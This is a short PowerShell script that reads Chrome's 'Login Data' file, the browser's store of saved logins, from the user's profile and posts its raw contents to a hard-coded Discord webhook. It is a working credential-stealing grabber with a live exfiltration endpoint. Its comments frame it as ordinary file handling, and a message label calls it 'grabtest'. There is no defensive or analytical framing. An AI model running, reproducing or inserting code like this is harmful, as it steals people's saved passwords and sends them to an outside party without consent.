# Set the path to your file (path is correct)
$filePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"

# Check if the file exists using -LiteralPath to handle spaces correctly
if (-Not (Test-Path -LiteralPath $filePath)) {
    Write-Host "File not found: $filePath"
    exit
}

# Read the file content using -LiteralPath as well
$fileContent = Get-Content -LiteralPath $filePath -Raw

# Sanitize content to avoid breaking JSON or Discord message (escape triple backticks)
$safeContent = $fileContent -replace '```', "'''"

# Your Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1374075895941169322/0q_M5862QHhmUHeIUIu9b0Y_L2feBqu-tbTz3gsbEiASX5HtOc8gwfh5fNMajSnbCrOq"

# Prepare the JSON payload with the content inside a Discord code block for safe formatting
$payload = @{
    content = "Contents of grabtest.txt:`n```txt`n$safeContent`n```"
} | ConvertTo-Json -Compress

# Send the POST request to Discord webhook
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'

Write-Host "File content sent to Discord webhook."
